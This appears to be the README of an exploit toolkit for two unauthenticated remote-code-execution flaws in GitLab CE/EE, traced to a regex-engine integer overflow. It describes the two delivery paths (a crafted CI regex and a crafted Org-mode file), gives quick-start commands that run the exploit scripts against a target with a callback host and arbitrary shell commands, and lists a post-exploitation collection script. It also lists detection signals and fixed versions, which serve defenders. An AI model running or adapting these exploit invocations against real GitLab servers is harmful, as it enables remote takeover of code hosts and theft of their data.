# GitLab Onigmo RCE Exploit Toolkit

**CVE-2026-97229** + **CVE-2026-110264** — Two critical (CVSS 10.0) unauthenticated RCE vulnerabilities in GitLab CE/EE via Onigmo regex engine integer overflow.

> **Authorized testing only.** Every target must be yours or covered by written authorization.

## Vulnerabilities

| CVE | Vector | Affected | Trigger | Auth Required |
|-----|--------|----------|---------|--------------|
| CVE-2026-97229 | CI/CD regex compiler | 19.2.0–19.4.1 | `GET /api/v4/projects/:id/ci/lint` | Unauthenticated trigger (write access for setup) |
| CVE-2026-110264 | Org-mode `.org` render | **7.0–19.5.0** | Render a crafted `.org` file | **No account needed** |

## Architecture

Both CVEs exploit the same root cause: Onigmo regex engine integer overflow → OOB write → VM hijack → `system()`. The difference is the delivery path:

- **CVE-2026-97229**: Malicious regex in `.gitlab-ci.yml` `rules:exists:regexp` → CI lint API
- **CVE-2026-110264**: Malicious `#+TODO:` keyword in `.org` file → Org-mode renderer

## Quick Start

```bash
# CVE-2026-97229 — CI lint path
python3 exploit/cve97229.py --url http://target:8080 \
    --token glpat-xxx --callback-host YOUR_IP \
    --command 'id; hostname' --authorized --scope scope.txt

# CVE-2026-110264 — Org-mode path (no auth needed!)
python3 exploit/cve110264.py --url http://target:8080 \
    --callback-host YOUR_IP --command 'id'

# Probe only (no exploitation)
python3 exploit/cve97229.py --url http://target --probe-only
python3 exploit/cve110264.py --url http://target --probe-only
```

## Project Layout

```
exploit/
├── cve97229.py       # CI lint regex RCE (CVE-2026-97229)
├── cve110264.py      # Org-mode render RCE (CVE-2026-110264)
├── layout.py         # libruby.so offset derivation
├── common.py         # shared Onigmo payload + callback server
└── post/
    └── collect.sh    # post-exploitation collection
lab/
├── run.sh            # Docker lab launcher
└── stop.sh           # Lab cleanup
docs/
├── CVE-2026-97229.md # Technical analysis
└── CVE-2026-110264.md # Technical analysis
```

## Detection

Triple signal for both CVEs:
1. Puma worker crash: `[BUG] Segmentation fault` with `org-ruby` or `regexp_matcher.rb` frames
2. Workhorse 502: `badgateway: failed to receive response: EOF`
3. Git content: `(?#)` split quantifiers, `[[:word:]]` repeats, 4-byte UTF-8 paths

## Fixed Versions

| CVE | Fixed |
|-----|-------|
| CVE-2026-97229 | 19.2.8, 19.3.5, 19.4.2 |
| CVE-2026-110264 | 18.11.13, 19.0.10, 19.1.9, 19.2.9, 19.3.6, 19.4.3, 19.5.1 |

## Credits

- **joaxcar** — CVE-2026-97229 original discovery (HackerOne)
- **Rapid7 (Jonah Burgess)** — CVE-2026-97229 technical analysis and independent PoC
- **gandli** — CVE-2026-97229 lab framework reference
- **GitLab Security** — Detection rules and advisory
- CVE-2026-110264 exploitation technique derived from GitLab's published detection notes

## License

MIT — for authorized security testing only.
